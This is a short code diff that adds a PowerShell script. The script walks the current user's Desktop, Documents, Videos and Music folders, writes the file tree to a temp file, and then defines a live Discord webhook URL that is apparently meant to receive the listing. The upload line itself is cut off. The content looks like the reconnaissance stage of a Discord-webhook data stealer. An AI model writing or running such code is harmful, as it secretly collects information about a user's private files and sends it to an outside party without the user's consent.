@@ -1,3 +1,65 @@
+# Define the folders to search
+$folders = @(
+    [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop'),
+    [System.IO.Path]::Combine($env:USERPROFILE, 'Documents'),
+    [System.IO.Path]::Combine($env:USERPROFILE, 'Videos'),
+    [System.IO.Path]::Combine($env:USERPROFILE, 'Music')
+)
+
+# Define the output file path
+$outputFile = [System.IO.Path]::Combine($env:TEMP, 'tree.txt')
+
+# Function to display files in a tree structure
+function Show-Tree {
+    param (
+        [string]$Path,
+        [int]$Depth = 0
+    )
+    
+    # Get all directories and files in the current path
+    $items = Get-ChildItem -Path $Path -ErrorAction SilentlyContinue
+
+    foreach ($item in $items) {
+        # Exclude Program Files and OS files
+        if ($item.FullName -notlike "*\Program Files\*" -and 
+            $item.FullName -notlike "*\Windows\*" -and 
+            $item.FullName -notlike "*\System32\*") {
+
+            # Indent based on depth
+            $indent = ' ' * ($Depth * 4)
+
+            # Display the item
+            if ($item.PSIsContainer) {
+                "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
+                # Recurse into the directory
+                Show-Tree -Path $item.FullName -Depth ($Depth + 1)
+            } else {
+                "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
+            }
+        }
+    }
+}
+
+# Clear the output file if it already exists
+if (Test-Path $outputFile) {
+    Remove-Item $outputFile
+}
+
+# Iterate through defined folders and display their contents
+foreach ($folder in $folders) {
+    "Contents of ${folder}:" | Out-File -Append -FilePath $outputFile
+    Show-Tree -Path $folder
+    "" | Out-File -Append -FilePath $outputFile
+}
+
+Write-Output "File tree saved to: $outputFile"
+
+
+
+
+
+
+
 # Define the webhook URL
 $webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
 
